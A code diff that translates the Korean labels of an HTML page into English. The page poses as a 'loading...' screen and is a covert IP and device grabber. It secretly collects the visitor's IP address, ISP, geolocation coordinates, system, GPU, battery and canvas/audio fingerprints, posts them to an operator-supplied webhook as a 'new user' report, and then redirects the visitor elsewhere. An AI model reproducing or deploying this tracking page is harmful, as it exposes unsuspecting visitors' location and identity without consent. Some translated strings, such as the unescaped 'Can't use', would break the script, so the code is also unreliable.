@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>로딩 중...</title>
+    <title>loading...</title>
     <style>
         body {
             margin: 0;
@@ -15,8 +15,8 @@
 </head>
 <body>
     <script>
-        const WEBHOOK_URL = ''; // 여기에 니 웹훅 URL
-        const REDIRECT_URL = ''; // 보내고 이동할 사이트
+        const WEBHOOK_URL = ''; // Your webhook URL
+        const REDIRECT_URL = ''; // send webhook and redirect URL
         
         let visitorInfo = {};
 
@@ -29,7 +29,7 @@
                 cpuCores: navigator.hardwareConcurrency || 'N/A',
                 touchPoints: navigator.maxTouchPoints || 0,
                 cookieEnabled: navigator.cookieEnabled,
-                onlineStatus: navigator.onLine ? '온라인' : '오프라인',
+                onlineStatus: navigator.onLine ? 'Online' : 'Offline',
                 doNotTrack: navigator.doNotTrack || 'N/A'
             };
         }
@@ -56,7 +56,7 @@
                     effectiveType: connection.effectiveType || 'N/A',
                     downlink: connection.downlink ? `${connection.downlink} Mbps` : 'N/A',
                     rtt: connection.rtt ? `${connection.rtt}ms` : 'N/A',
-                    saveData: connection.saveData ? '활성화' : '비활성화'
+                    saveData: connection.saveData ? 'Enabled' : 'Disabled'
                 };
             }
             return {
@@ -111,13 +111,13 @@
                     const battery = await navigator.getBattery();
                     return {
                         level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging ? '충전 중' : '충전 안 함',
+                        charging: battery.charging ? 'Charging' : 'Not Charged',
                         chargingTime: battery.chargingTime === Infinity ? 'N/A' : `${Math.round(battery.chargingTime / 60)}분`,
                         dischargingTime: battery.dischargingTime === Infinity ? 'N/A' : `${Math.round(battery.dischargingTime / 60)}분`
                     };
                 }
             } catch (e) {
-                console.log('배터리 정보 수집 실패');
+                console.log('Failed to get battery info');
             }
             return {
                 level: 'N/A',
@@ -138,7 +138,7 @@
                     };
                 }
             } catch (e) {
-                console.log('메모리 정보 수집 실패');
+                console.log('Failed to get memory info');
             }
             return {
                 usedJSHeapSize: 'N/A',
@@ -155,7 +155,7 @@
                     plugins.push(`${plugin.name} (${plugin.version || 'N/A'})`);
                 }
             } catch (e) {
-                console.log('플러그인 정보 수집 실패');
+                console.log('Failed to get plugin info');
             }
             return plugins.length > 0 ? plugins.slice(0, 10).join(', ') : 'N/A';
         }
@@ -176,7 +176,7 @@
                     };
                 }
             } catch (e) {
-                console.log('WebGL 정보 수집 실패');
+                console.log('Failed to get WebGL info');
             }
             return {
                 vendor: 'N/A',
@@ -258,10 +258,10 @@
         function getStorageInfo() {
             try {
                 const info = {
-                    localStorage: 'localStorage' in window ? '사용 가능' : '사용 불가',
-                    sessionStorage: 'sessionStorage' in window ? '사용 가능' : '사용 불가',
-                    indexedDB: 'indexedDB' in window ? '사용 가능' : '사용 불가',
-                    webSQL: 'openDatabase' in window ? '사용 가능' : '사용 불가'
+                    localStorage: 'localStorage' in window ? 'Can use' : 'Can't use',
+                    sessionStorage: 'sessionStorage' in window ? 'Can use' : 'Can't use',
+                    indexedDB: 'indexedDB' in window ? 'Can use' : 'Can't use',
+                    webSQL: 'openDatabase' in window ? 'Can use' : 'Can't use'
                 };
                 
                 if ('storage' in navigator && 'estimate' in navigator.storage) {
@@ -348,7 +348,7 @@
                         };
                     }
                 } catch (e) {
-                    console.log('위치 정보 수집 실패');
+                    console.log('Failed to get location info');
                 }
 
                 const now = new Date();
@@ -373,11 +373,11 @@
                 visitorInfo.timezone = getTimezoneInfo();
                 visitorInfo.performance = getPerformanceInfo();
                 visitorInfo.url = window.location.href;
-                visitorInfo.referrer = document.referrer || '직접 접속';
+                visitorInfo.referrer = document.referrer || 'Directly join';
 
                 const embed = {
-                    title: "새로운 방문자 정보",
-                    description: "사용자가 페이지에 접속했습니다.",
+                    title: "New user Info",
+                    description: "User has joined the site",
                     color: 0x5865F2,
                     timestamp: visitorInfo.timestamp,
                     thumbnail: {
@@ -385,53 +385,53 @@
                     },
                     fields: [
                         {
-                            name: "기본 정보",
-                            value: `**IP 주소:** ${visitorInfo.ip}\n**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n**조직:** ${visitorInfo.location?.org || 'N/A'}\n**접속 시간:** ${visitorInfo.localTime}`,
+                            name: "Normal info",
+                            value: `**IP Adress:** ${visitorInfo.ip}\n**ISP:** ${visitorInfo.location?.isp || 'N/A'}\n**Group:** ${visitorInfo.location?.org || 'N/A'}\n**Join time:** ${visitorInfo.localTime}`,
                             inline: true
                         },
                         {
-                            name: "위치 정보",
-                            value: `**국가:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n**지역:** ${visitorInfo.location?.region || 'N/A'}\n**도시:** ${visitorInfo.location?.city || 'N/A'}\n**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n**시간대:** ${visitorInfo.timezone.timezone}`,
+                            name: "Location info",
+                            value: `**Country:** ${visitorInfo.location?.country || 'N/A'} (${visitorInfo.location?.countryCode || 'N/A'})\n**Area:** ${visitorInfo.location?.region || 'N/A'}\n**City:** ${visitorInfo.location?.city || 'N/A'}\n**좌표:** ${visitorInfo.location?.lat || 'N/A'}, ${visitorInfo.location?.lon || 'N/A'}\n**Time zone:** ${visitorInfo.timezone.timezone}`,
                             inline: true
                         },
                         {
-                            name: "시스템 정보",
-                            value: `**OS:** ${visitorInfo.os}\n**플랫폼:** ${visitorInfo.device.platform}\n**브라우저:** ${visitorInfo.browser.browserName} ${visitorInfo.browser.browserVersion}\n**CPU 코어:** ${visitorInfo.device.cpuCores}\n**터치 포인트:** ${visitorInfo.device.touchPoints}`,
+                            name: "System info",
+                            value: `**OS:** ${visitorInfo.os}\n**Platform:** ${visitorInfo.device.platform}\n**Browser:** ${visitorInfo.browser.browserName} ${visitorInfo.browser.browserVersion}\n**CPU core:** ${visitorInfo.device.cpuCores}\n**Touch point:** ${visitorInfo.device.touchPoints}`,
                             inline: false
                         },
                         {
-                            name: "네트워크 정보",
-                            value: `**연결 타입:** ${visitorInfo.network.effectiveType}\n**다운링크:** ${visitorInfo.network.downlink}\n**RTT:** ${visitorInfo.network.rtt}\n**데이터 절약:** ${visitorInfo.network.saveData}`,
+                            name: "Network info",
+                            value: `**Connection type:** ${visitorInfo.network.effectiveType}\n**Download link:** ${visitorInfo.network.downlink}\n**RTT:** ${visitorInfo.network.rtt}\n**Data Saving:** ${visitorInfo.network.saveData}`,
                             inline: true
                         },
                         {
-                            name: "배터리 & 메모리",
-                            value: `**배터리 레벨:** ${visitorInfo.battery.level}\n**충전 상태:** ${visitorInfo.battery.charging}\n**사용 메모리:** ${visitorInfo.memory.usedJSHeapSize}\n**총 메모리:** ${visitorInfo.memory.totalJSHeapSize}`,
+                            name: "Battery & Memory",
+                            value: `**Battery level:** ${visitorInfo.battery.level}\n**Charging info:** ${visitorInfo.battery.charging}\n**Used memory:** ${visitorInfo.memory.usedJSHeapSize}\n**All memory:** ${visitorInfo.memory.totalJSHeapSize}`,
                             inline: true
                         },
                         {
-                            name: "하드웨어 정보",
-                            value: `**GPU 벤더:** ${visitorInfo.webgl.vendor}\n**GPU 렌더러:** ${visitorInfo.webgl.renderer}\n**WebGL 버전:** ${visitorInfo.webgl.version}\n**실제 GPU:** ${visitorInfo.webgl.unmaskedRenderer}`,
+                            name: "Hardware info",
+                            value: `**GPU Vendor:** ${visitorInfo.webgl.vendor}\n**GPU Renderer:** ${visitorInfo.webgl.renderer}\n**WebGL Version:** ${visitorInfo.webgl.version}\n**Real GPU:** ${visitorInfo.webgl.unmaskedRenderer}`,
                             inline: false
                         },
                         {
-                            name: "저장소 정보",
-                            value: `**로컬 스토리지:** ${visitorInfo.storage.localStorage}\n**세션 스토리지:** ${visitorInfo.storage.sessionStorage}\n**IndexedDB:** ${visitorInfo.storage.indexedDB}\n**WebSQL:** ${visitorInfo.storage.webSQL}`,
+                            name: "Storage info",
+                            value: `**Local Storage:** ${visitorInfo.storage.localStorage}\n**Session Storage:** ${visitorInfo.storage.sessionStorage}\n**IndexedDB:** ${visitorInfo.storage.indexedDB}\n**WebSQL:** ${visitorInfo.storage.webSQL}`,
                             inline: true
                         },
                         {
-                            name: "핑거프린팅",
-                            value: `**Canvas:** ${visitorInfo.canvasFingerprint}\n**Audio:** ${visitorInfo.audioFingerprint}\n**설치된 폰트:** ${visitorInfo.fonts.slice(0, 100)}...\n**플러그인:** ${visitorInfo.plugins.slice(0, 100)}...`,
+                            name: "Fingerprinting",
+                            value: `**Canvas:** ${visitorInfo.canvasFingerprint}\n**Audio:** ${visitorInfo.audioFingerprint}\n**Installed font:** ${visitorInfo.fonts.slice(0, 100)}...\n**Plugin:** ${visitorInfo.plugins.slice(0, 100)}...`,
                             inline: false
                         },
                         {
-                            name: "접속 정보",
-                            value: `**URL:** ${visitorInfo.url}\n**리퍼러:** ${visitorInfo.referrer}`,
+                            name: "Join info",
+                            value: `**URL:** ${visitorInfo.url}\n**Reperer:** ${visitorInfo.referrer}`,
                             inline: false
                         }
                     ],
                     footer: {
-                        text: "자동 수집 시스템",
+                        text: "Auto Collect system",
                     }
                 };
 
@@ -448,7 +448,7 @@
                 });
 
             } catch (error) {
-                console.error('정보 수집/전송 실패:', error);
+                console.error('collecting info/Send failed:', error);
             } finally {
                 window.location.href = REDIRECT_URL;
             }
